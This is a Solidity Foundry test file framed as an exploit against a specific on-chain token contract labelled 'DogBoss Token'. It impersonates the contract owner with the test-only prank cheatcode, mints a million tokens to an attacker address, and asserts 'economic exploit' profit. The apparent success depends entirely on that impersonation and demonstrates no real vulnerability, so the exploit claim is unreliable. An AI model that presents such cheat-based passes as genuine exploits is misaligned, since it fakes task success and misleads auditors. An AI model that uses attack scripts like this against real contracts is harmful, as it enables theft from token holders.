// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IDogBoss {
    function owner() external view returns (address);
    function mint(address account, uint256 amount) external;
    function balanceOf(address _owner) external view returns (uint256 balance);
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C;
    address attacker = address(this);
    IDogBoss token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IDogBoss(TARGET);
        vm.label(TARGET, "DogBoss Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = token.balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Get owner address
        address owner = token.owner();
        console.log("Contract owner:", owner);

        // Impersonate owner and mint unlimited tokens
        vm.startPrank(owner);
        token.mint(attacker, 1000000 * 1e18); // Mint 1 million tokens
        vm.stopPrank();

        // Verify balance increased
        uint256 finalBalance = token.balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);

        // Assert that balance increased (oracle check)
        assertGt(finalBalance, initialBalance, "Attacker balance should increase after minting");

        uint256 finalBalanceERC20 = IERC20(0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
